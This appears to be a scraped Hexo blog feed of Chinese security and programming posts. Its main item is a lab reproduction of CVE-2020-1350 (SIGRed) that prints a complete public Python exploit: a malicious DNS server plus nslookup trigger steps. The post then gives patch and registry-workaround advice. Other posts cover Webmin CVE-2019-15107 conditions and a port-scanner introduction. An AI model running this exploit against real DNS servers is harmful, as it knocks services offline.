，这种方式个人感觉也是可行的，虽然感觉试试难度挺大。</h4><h4 id="5，遇到BUG-，少用print-多用idea-的debug"><a href="#5，遇到BUG-，少用print-多用idea-的debug" class="headerlink" title="5，遇到BUG ，少用print,多用idea 的debug."></a>5，遇到BUG ，少用print,多用idea 的debug.</h4><p><a href="https://www.buhuixiu.com/images/tencent_capi.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/tencent_capi.png"></a></img></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo有效快速可复制搬迁</title>
      <link href="/2021/06/06/Hexo%E6%9C%89%E6%95%88%E5%BF%AB%E9%80%9F%E5%8F%AF%E5%A4%8D%E5%88%B6%E6%90%AC%E8%BF%81/"/>
      <url>/2021/06/06/Hexo%E6%9C%89%E6%95%88%E5%BF%AB%E9%80%9F%E5%8F%AF%E5%A4%8D%E5%88%B6%E6%90%AC%E8%BF%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="https://www.buhuixiu.com/images/hexo_one.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/hexo_one.png"></a></img></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-1350 DNS Server远程代码执行漏洞 利用及修复建议</title>
      <link href="/2020/07/31/CVE-2020-1350-DNS-Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%88%A9%E7%94%A8%E5%8F%8A%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/"/>
      <url>/2020/07/31/CVE-2020-1350-DNS-Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%88%A9%E7%94%A8%E5%8F%8A%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a><font color="red">漏洞原理：</font></h2><p>基本的原理类似于缓冲溢出，具体看是接收数据时，没有对数据长度做严格的校验，可以导致DNS服务DOWN。。或者更巧妙的方式，可以利用溢出的代码，进行远程代码执行。目前没看到别人写远程代码执行的POC，主要是使得DNS服务不可用的POC.</p><h2 id="如何利用？"><a href="#如何利用？" class="headerlink" title="如何利用？"></a>如何利用？</h2><p>利用的方式相对简单。利用自己可以控制的域名，通过NS域名解析。让DNS服务器与攻击服务器进行通讯。通过TCP通讯连接，发送构成溢出的数据。导致DNS DOWN机。<br>这里，我们只是在内网做实验。就只简单的在DNS服务器上，对一个特定的域名<font color="green">ibrokethe.net</font> 设置条件转发，让它转发到攻击服务器上。<br>如果是实际的攻击就需要利用自己可以控制的域名，去构成DNS服务器与实际攻击服务器的通讯。<br>攻击的数据包是别人写好的playload.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># CVE-2020-1350 (SIGRed)</span><br><span class="hljs-comment"># Windows DNS DoS Exploit</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Credits for the bug are entirely down to Check Point Research (@_cpresearch_) who did an incredible writeup of this bug (props to @sagitz_ for the post)</span><br><span class="hljs-comment"># Their writeup can be found at https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This exploit was written by @maxpl0it</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Quick summary of how it works:</span><br><span class="hljs-comment">#   1) On the LAN you trigger a DNS request (more specifically, a request for the SIG records) for an evil domain (for example 9.evil_domain.com)</span><br><span class="hljs-comment">#   2) This gets sent to the vulnerable Windows server&#x27;s DNS server</span><br><span class="hljs-comment">#   3) The vulnerable server sends a request to whatever DNS it forwards requests to (usually the standard Google IPs)</span><br><span class="hljs-comment">#   4) The Google DNS responds with the nameservers for the evil domain</span><br><span class="hljs-comment">#   5) The vulnerable server then acts as a DNS client and sends a request to the evil DNS server</span><br><span class="hljs-comment">#   6) The evil server responds with a payload that overflows a 2-byte number, causing a smaller allocation to take place than is required</span><br><span class="hljs-comment">#   7) The signature is copied over and things break (of course), crashing the vulnerable server&#x27;s DNS server</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># General Setup:</span><br><span class="hljs-comment"># --------------</span><br><span class="hljs-comment"># This exploit requires you to set up a domain with its own nameservers pointing to your server.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Set up the server and run this script. It will listen on port 53 on both TCP and UDP</span><br><span class="hljs-comment"># If you get an error saying that the ports are busy, use netstat -pa to figure out what&#x27;s listening on the domain ports</span><br><span class="hljs-comment"># (probably systemd-resolved) and disable + stop it. If nothing&#x27;s listening on the server, make sure you killed all instances of</span><br><span class="hljs-comment"># this script before re-running.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># For example, I ran `python sigred_dos.py ibrokethe.net` to start the malicious DNS server</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Execution:</span><br><span class="hljs-comment"># ----------</span><br><span class="hljs-comment"># In order to trigger the vulnerability on the Windows DNS server, run `nslookup -type=sig 9.your_domain_name_here dns_server_to_target`</span><br><span class="hljs-comment"># For example, I ran `nslookup -type=sig 9.ibrokethe.net 127.0.0.1` as I was running this on the server.</span><br><br><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> struct<br><br>domain = <span class="hljs-literal">None</span><br>domain_compressed = <span class="hljs-literal">None</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">setup</span>():</span><br><span class="hljs-keyword">global</span> domain_compressed<br><span class="hljs-comment"># Setup</span><br>domain_split = [<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">len</span>(i)) + i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> domain.split(<span class="hljs-string">&quot;.&quot;</span>)]<br>domain_compressed = <span class="hljs-string">&quot;&quot;</span>.join(domain_split) + <span class="hljs-string">&quot;\x00&quot;</span><br><br><br><br><span class="hljs-comment"># The TCP port is contacted second</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tcp_server</span>():</span><br>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>sock.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">53</span>))<br>sock.listen(<span class="hljs-number">50</span>)<br>response = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br><span class="hljs-keyword">try</span>:<br>connection, client_address = sock.accept()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Received TCP Connection&quot;</span>)<br>data = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># SIG Contents</span><br>sig = <span class="hljs-string">&quot;\x00\x01&quot;</span> <span class="hljs-comment"># Type covered</span><br>sig += <span class="hljs-string">&quot;\x05&quot;</span> <span class="hljs-comment"># Algorithm - RSA/SHA1</span><br>sig += <span class="hljs-string">&quot;\x00&quot;</span> <span class="hljs-comment"># Labels</span><br>sig += <span class="hljs-string">&quot;\x00\x00\x00\x20&quot;</span> <span class="hljs-comment"># TTL</span><br>sig += <span class="hljs-string">&quot;\x68\x76\xa2\x1f&quot;</span> <span class="hljs-comment"># Signature Expiration</span><br>sig += <span class="hljs-string">&quot;\x5d\x2c\xca\x1f&quot;</span> <span class="hljs-comment"># Signature Inception</span><br>sig += <span class="hljs-string">&quot;\x9e\x04&quot;</span> <span class="hljs-comment"># Key Tag</span><br>sig += <span class="hljs-string">&quot;\xc0\x0d&quot;</span> <span class="hljs-comment"># Signers Name - Points to the &#x27;9&#x27; in 9.domain.</span><br>sig += (<span class="hljs-string">&quot;\x00&quot;</span>*(<span class="hljs-number">19</span> - <span class="hljs-built_in">len</span>(domain)) + (<span class="hljs-string">&quot;\x0f&quot;</span> + <span class="hljs-string">&quot;\xff&quot;</span>*<span class="hljs-number">15</span>)*<span class="hljs-number">5</span>).ljust(<span class="hljs-number">65465</span> - <span class="hljs-built_in">len</span>(domain_compressed), <span class="hljs-string">&quot;\x00&quot;</span>) <span class="hljs-comment"># Signature - Here be overflows!</span><br><br><span class="hljs-comment"># SIG Header</span><br>hdr = <span class="hljs-string">&quot;\xc0\x0c&quot;</span> <span class="hljs-comment"># Points to &quot;9.domain&quot;</span><br>hdr += <span class="hljs-string">&quot;\x00\x18&quot;</span> <span class="hljs-comment"># Type: SIG</span><br>hdr += <span class="hljs-string">&quot;\x00\x01&quot;</span> <span class="hljs-comment"># Class: IN</span><br>hdr += <span class="hljs-string">&quot;\x00\x00\x00\x20&quot;</span> <span class="hljs-comment"># TTL</span><br>hdr += struct.pack(<span class="hljs-string">&#x27;&gt;H&#x27;</span>, <span class="hljs-built_in">len</span>(sig)) <span class="hljs-comment"># Data Length</span><br><br><span class="hljs-comment"># DNS Header</span><br>response = <span class="hljs-string">&quot;\x81\xa0&quot;</span> <span class="hljs-comment"># Flags: Response + Truncated + Recursion Desired + Recursion Available</span><br>response += <span class="hljs-string">&quot;\x00\x01&quot;</span> <span class="hljs-comment"># Questions</span><br>response += <span class="hljs-string">&quot;\x00\x01&quot;</span> <span class="hljs-comment"># Answer RRs</span><br>response += <span class="hljs-string">&quot;\x00\x00&quot;</span> <span class="hljs-comment"># Authority RRs</span><br>response += <span class="hljs-string">&quot;\x00\x00&quot;</span> <span class="hljs-comment"># Additional RRs</span><br>response += <span class="hljs-string">&quot;\x019&quot;</span> + domain_compressed <span class="hljs-comment"># Name (9.domain)</span><br>response += <span class="hljs-string">&quot;\x00\x18&quot;</span> <span class="hljs-comment"># Type: SIG</span><br>response += <span class="hljs-string">&quot;\x00\x01&quot;</span> <span class="hljs-comment"># Class: IN</span><br><span class="hljs-keyword">try</span>:<br>data += connection.recv(<span class="hljs-number">65535</span>)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br>len_msg = <span class="hljs-built_in">len</span>(response + hdr + sig) + <span class="hljs-number">2</span> <span class="hljs-comment"># +2 for the transaction ID</span><br><span class="hljs-comment"># Msg Size + Transaction ID + DNS Headers + Answer Headers + Answer (Signature)</span><br>connection.sendall(struct.pack(<span class="hljs-string">&#x27;&gt;H&#x27;</span>, len_msg) + data[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + response + hdr + sig)<br>connection.close()<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br><br><br><span class="hljs-comment"># The UDP server is contacted first</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">udp_server</span>():</span><br>sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br>server_address = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>server_port = <span class="hljs-number">53</span><br>sock.bind((server_address, server_port))<br>response = <span class="hljs-string">&quot;\x83\x80&quot;</span> <span class="hljs-comment"># Flags: Response + Truncated + Recursion Desired + Recursion Available</span><br>response += <span class="hljs-string">&quot;\x00\x01&quot;</span> <span class="hljs-comment"># Questions</span><br>response += <span class="hljs-string">&quot;\x00\x00&quot;</span> <span class="hljs-comment"># Answer RRs</span><br>response += <span class="hljs-string">&quot;\x00\x01&quot;</span> <span class="hljs-comment"># Authority RRs</span><br>response += <span class="hljs-string">&quot;\x00\x00&quot;</span> <span class="hljs-comment"># Additional RRs</span><br><br><span class="hljs-comment"># Queries</span><br>response += <span class="hljs-string">&quot;\x019&quot;</span> + domain_compressed <span class="hljs-comment"># Name</span><br>response += <span class="hljs-string">&quot;\x00\x18&quot;</span> <span class="hljs-comment"># Type: SIG</span><br>response += <span class="hljs-string">&quot;\x00\x01&quot;</span> <span class="hljs-comment"># Class: IN</span><br><br><span class="hljs-comment"># Data</span><br>data = <span class="hljs-string">&quot;\x03ns1\xc0\x0c&quot;</span> <span class="hljs-comment"># ns1 + pointer to 4.ibrokethe.net</span><br>data += <span class="hljs-string">&quot;\x03ms1\xc0\x0c&quot;</span> <span class="hljs-comment"># ms1 + pointer to 4.ibrokethe.net</span><br>data += <span class="hljs-string">&quot;\x0b\xff\xb4\x5f&quot;</span> <span class="hljs-comment"># Serial Number</span><br>data += <span class="hljs-string">&quot;\x00\x00\x0e\x10&quot;</span> <span class="hljs-comment"># Refresh Interval</span><br>data += <span class="hljs-string">&quot;\x00\x00\x2a\x30&quot;</span> <span class="hljs-comment"># Response Interval</span><br>data += <span class="hljs-string">&quot;\x00\x01\x51\x80&quot;</span> <span class="hljs-comment"># Expiration Limit</span><br>data += <span class="hljs-string">&quot;\x00\x00\x00\x20&quot;</span> <span class="hljs-comment"># Minimum TTL</span><br><br><span class="hljs-comment"># Authoritative Nameservers</span><br>response += <span class="hljs-string">&quot;\xc0\x0c&quot;</span> <span class="hljs-comment"># Compressed pointer to &quot;4.ibrokethe.net&quot;</span><br>response += <span class="hljs-string">&quot;\x00\x06&quot;</span> <span class="hljs-comment"># Type: SOA</span><br>response += <span class="hljs-string">&quot;\x00\x01&quot;</span> <span class="hljs-comment"># Class: IN</span><br>response += <span class="hljs-string">&quot;\x00\x00\x00\x20&quot;</span> <span class="hljs-comment"># TTL</span><br>response += struct.pack(<span class="hljs-string">&#x27;&gt;H&#x27;</span>, <span class="hljs-built_in">len</span>(data))<br><br><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br><span class="hljs-keyword">try</span>:<br>recvd, client_address = sock.recvfrom(<span class="hljs-number">65535</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Received UDP connection&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(recvd) &gt; <span class="hljs-number">2</span>:<br><span class="hljs-built_in">print</span>(client_address)<br><span class="hljs-built_in">print</span>(response + data)<br><span class="hljs-built_in">print</span>(recvd[:<span class="hljs-number">2</span>])<br>sock.sendto(recvd[:<span class="hljs-number">2</span>] + response.encode + data, client_address)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">if len(sys.argv) != 2:</span><br><span class="hljs-string">print(&quot;python sigred_dos.py evil_domain&quot;) # For example, I ran python `sigred_dos.py ibrokethe.net`</span><br><span class="hljs-string">exit()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># Domain name must be *a maximum* of 19 characters in length</span><br><br>domain = <span class="hljs-string">&#x27;ibrokethe.net&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(domain) &gt; <span class="hljs-number">19</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Domain length must be less than 20 characters&quot;</span>)<br><br>setup()<br><br><span class="hljs-comment"># Sets up two servers: one on UDP port 53 and one on TCP port 53</span><br>first = threading.Thread(target=udp_server)<br>second = threading.Thread(target=tcp_server)<br><br>first.start()<br>second.start()<br><br>first.join()<br>second.join()<br><br><br></code></pre></td></tr></table></figure><p>整个代码的主要功能就是利用两个线程分别在UDP,TCP 53端口构成监听。监听到DNS请求后，通过发送响应数据payload,从而构成请求方DNS服务器的溢出，造成DNS服务宕机。</p><h2 id="别人的图"><a href="#别人的图" class="headerlink" title="别人的图"></a><font color="green">别人的图</font></h2><p><a href="https://www.buhuixiu.com/images/CVE-2020-1350.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/CVE-2020-1350.png"></a></img></p><h2 id="我自己的实验"><a href="#我自己的实验" class="headerlink" title="我自己的实验"></a><font color="green">我自己的实验</font></h2><p><a href="https://www.buhuixiu.com/images/CVE-2020-1350-2.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/CVE-2020-1350-2.png"></a></img><br><a href="https://www.buhuixiu.com/images/CVE-2020-1350-3.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/CVE-2020-1350-3.png"></a></img><br><a href="https://www.buhuixiu.com/images/CVE-2020-1350-4.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/CVE-2020-1350-4.png"></a></img></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>推荐的修复方式当让是更新微软的补丁，响应补丁比较大。1G多,是一个2016的累积更新包。<br><a href="http://download.windowsupdate.com/c/msdownload/update/software/secu/2020/07/windows10.0-kb4565511-x64_5d2481cbc9319147ad3c8f42e07a0ee182909be9.msu">2020-适用于Windows Server2016 的07累积更新 适用基于X64的系统（KB4565511) </a></p><p>临时修复方案。更改注册表值。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">@echo off<br>reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters&quot; /v &quot;TcpReceivePacketSize&quot; /t REG_DWORD /d 0xFF00 /f<br>net stop DNS &amp;&amp; net start DNS<br></code></pre></td></tr></table></figure><p><font color="2bbc8a">相应特征识别应该比较容易被应用防火墙和态势感知设备所识别。所以，关注这些设备的一些日志报警和DNS的异常宕机。可以评估下响应的风险，尽快修复该漏洞。。</font></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> CVE-2020-1350-DNS-Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cve-2019-15107验证</title>
      <link href="/2020/07/28/cve-2019-15107%E9%AA%8C%E8%AF%81/"/>
      <url>/2020/07/28/cve-2019-15107%E9%AA%8C%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="相关漏洞利用条件"><a href="#相关漏洞利用条件" class="headerlink" title="相关漏洞利用条件"></a>相关漏洞利用条件</h2><p>1， 官方给的漏洞影响版本为Webmin&lt;=1.920，于是当晚我使用了Webmin 1.920的版本进行的测试<br>2， 在1.920版本中漏洞的触发需要开启密码重置功能，<font color="green">“Webmin-&gt; Webmin Configuration-&gt; Authentication”</font> 下把允许用户使用旧密码设置新密码的选项给选上，并保存！<br><a href="https://www.buhuixiu.com/images/cve-2019-15107-3.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/cve-2019-15107-3.png"></a></img><br><a href="https://www.buhuixiu.com/images/cve-2019-15107-4.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/cve-2019-15107-4.png"></a></img><br>3,  原以为在利用过程中，需要修改一个配置文件。<font color="red">/etc/webmin/config     referers_none=1</font><br>一直在如下的错误提上纠结。</p><p> 但是后来想起，referers是可以轻松欺骗的。所以这个不是利用的必须条件。</p><h2 id="相关利用也非常的简单。"><a href="#相关利用也非常的简单。" class="headerlink" title="相关利用也非常的简单。"></a>相关利用也非常的简单。</h2><p><a href="https://www.buhuixiu.com/images/cve-2019-15107-1.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/cve-2019-15107-1.png"></a></img><br>但是，过程其实也蛮艰辛。。主要在下面这个问题上绕圈圈。<br>其他的一些文档和payload上面都没发现类似的问题。看了别人的，也很少单独添加 referers，也可以执行远程命令的。<br><a href="https://www.buhuixiu.com/images/cve-2019-15107-5.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/cve-2019-15107-5.png"></a></img></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="https://www.buhuixiu.com/images/cve-2019-15107-2.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/cve-2019-15107-2.png"></a></img></p><h2 id="漏洞利用原理分析"><a href="#漏洞利用原理分析" class="headerlink" title="漏洞利用原理分析"></a>漏洞利用原理分析</h2><p> 请参考 <a href="https://blog.csdn.net/qq_43380549/article/details/100011292">Webmin(CVE-2019-15107) 远程代码执行漏洞之 backdoor 探究”</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> CVE-2019-15107-Webmin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> poc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 多线程扫描及资源冲突锁定应用</title>
      <link href="/2020/07/22/python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%89%AB%E6%8F%8F%E5%8F%8A%E8%B5%84%E6%BA%90%E5%86%B2%E7%AA%81%E9%94%81%E5%AE%9A%E5%BA%94%E7%94%A8/"/>
      <url>/2020/07/22/python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%89%AB%E6%8F%8F%E5%8F%8A%E8%B5%84%E6%BA%90%E5%86%B2%E7%AA%81%E9%94%81%E5%AE%9A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="https://www.buhuixiu.com/images/learn-python-tutorials.jpg" class="gallery-item"><img src="https://www.buhuixiu.com/images/learn-python-tutorials.jpg"></a></img></p><h2 id="面对多个云场景的应用，服务器大量的规则调整，临时规则，变更，安全组错误配置等。所以需要对多个云端的服务器进行端口扫描。"><a href="#面对多个云场景的应用，服务器大量的规则调整，临时规则，变更，安全组错误配置等。所以需要对多个云端的服务器进行端口扫描。" class="headerlink" title="面对多个云场景的应用，服务器大量的规则调整，临时规则，变更，安全组错误配置等。所以需要对多个云端的服务器进行端口扫描。"></a>面对多个云场景的应用，服务器大量的规则调整，临时规则，变更，安全组错误配置等。所以需要对多个云端的服务器进行端口扫描。</h2><p>幸运的是，云服务商一般提供了比较详细的服务器配置清单。这份清单可以很方便我们进行端口扫描。从而发现我们在<br>主机安全层，端口安全方面存在的一些问题。比如说，直接开饭22端口。比如说，测试环境的6379 等数据库端口暴露在公网或者内网等。<br>话不多说。直接copy一点点代码。</p><h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><h5 id="1-1-目前程序中写死了线程数：50"><a href="#1-1-目前程序中写死了线程数：50" class="headerlink" title="1.1  目前程序中写死了线程数：50"></a>1.1  目前程序中写死了线程数：50</h5><h5 id="1-2-相应的数据从云平台按照默认全部方式导出数据。相应的内网IP和外网IP在第13，14行。华为云需要单独进行处理下数据。阿里云只需要插入行数满足就OK"><a href="#1-2-相应的数据从云平台按照默认全部方式导出数据。相应的内网IP和外网IP在第13，14行。华为云需要单独进行处理下数据。阿里云只需要插入行数满足就OK" class="headerlink" title="1.2 相应的数据从云平台按照默认全部方式导出数据。相应的内网IP和外网IP在第13，14行。华为云需要单独进行处理下数据。阿里云只需要插入行数满足就OK."></a>1.2 相应的数据从云平台按照默认全部方式导出数据。相应的内网IP和外网IP在第13，14行。华为云需要单独进行处理下数据。阿里云只需要插入行数满足就OK.</h5><h5 id="1-3-导出的csv文件可以放在单一的文件夹下，或者分别防止在三个路径下。可以扫描到所有的csv后缀文件名。"><a href="#1-3-导出的csv文件可以放在单一的文件夹下，或者分别防止在三个路径下。可以扫描到所有的csv后缀文件名。" class="headerlink" title="1.3 导出的csv文件可以放在单一的文件夹下，或者分别防止在三个路径下。可以扫描到所有的csv后缀文件名。"></a>1.3 导出的csv文件可以放在单一的文件夹下，或者分别防止在三个路径下。可以扫描到所有的csv后缀文件名。</h5><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>PYTHON 3.8 默认，无其他的扩展包。</p><h2 id="threadingportscan-py-用于多线程端口扫描及将结果写入csv-文件中。"><a href="#threadingportscan-py-用于多线程端口扫描及将结果写入csv-文件中。" class="headerlink" title="threadingportscan.py  用于多线程端口扫描及将结果写入csv 文件中。"></a>threadingportscan.py  用于多线程端口扫描及将结果写入csv 文件中。</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 